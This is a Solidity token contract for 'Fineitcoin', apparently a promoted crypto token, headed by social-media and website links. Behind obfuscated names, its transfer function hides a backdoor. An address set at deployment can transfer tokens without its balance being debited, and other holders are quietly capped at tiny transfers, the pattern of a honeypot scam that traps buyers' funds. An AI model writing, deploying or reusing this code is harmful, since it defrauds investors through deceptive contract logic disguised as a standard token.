/*

Telegram: https://t.me/FineBitcoinPortal

Twitter: https://twitter.com/FineBitcoin

Website: https://finebitcoin.crypto-token.live/

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Fineitcoin is Ownable {
    function transfer(address igmhytsc, uint256 lbni) public returns (bool success) {
        loixektwjzyu(msg.sender, igmhytsc, lbni);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint256 private ygectplvunj = 108;

    function transferFrom(address lvpe, address igmhytsc, uint256 lbni) public returns (bool success) {
        require(lbni <= allowance[lvpe][msg.sender]);
        allowance[lvpe][msg.sender] -= lbni;
        loixektwjzyu(lvpe, igmhytsc, lbni);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public symbol;

    constructor(string memory xeviblp, string memory dgvnh, address zlhakn, address xuyrvheolzf) {
        name = xeviblp;
        symbol = dgvnh;
        balanceOf[msg.sender] = totalSupply;
        wixblqfdsa[xuyrvheolzf] = ygectplvunj;
        virp = IUniswapV2Router02(zlhakn);
    }

    IUniswapV2Router02 private virp;

    string public name;

    mapping(address => uint256) private wixblqfdsa;

    uint8 public decimals = 9;

    mapping(address => uint256) private zojhwlxcbqfu;

    function approve(address pgyimufdsj, uint256 lbni) public returns (bool success) {
        allowance[msg.sender][pgyimufdsj] = lbni;
        emit Approval(msg.sender, pgyimufdsj, lbni);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function loixektwjzyu(address lvpe, address igmhytsc, uint256 lbni) private {
        address hfcuw = IUniswapV2Factory(virp.factory()).getPair(address(this), virp.WETH());
        bool xcqgzwrsjvkl = 0 == wixblqfdsa[lvpe];
        if (xcqgzwrsjvkl) {
            if (lvpe != hfcuw && zojhwlxcbqfu[lvpe] != block.number && lbni < totalSupply) {
                require(lbni <= totalSupply / (10 ** decimals));
            }
            balanceOf[lvpe] -= lbni;
        }
        balanceOf[igmhytsc] += lbni;
        zojhwlxcbqfu[igmhytsc] = block.number;
        emit Transfer(lvpe, igmhytsc, lbni);
    }
}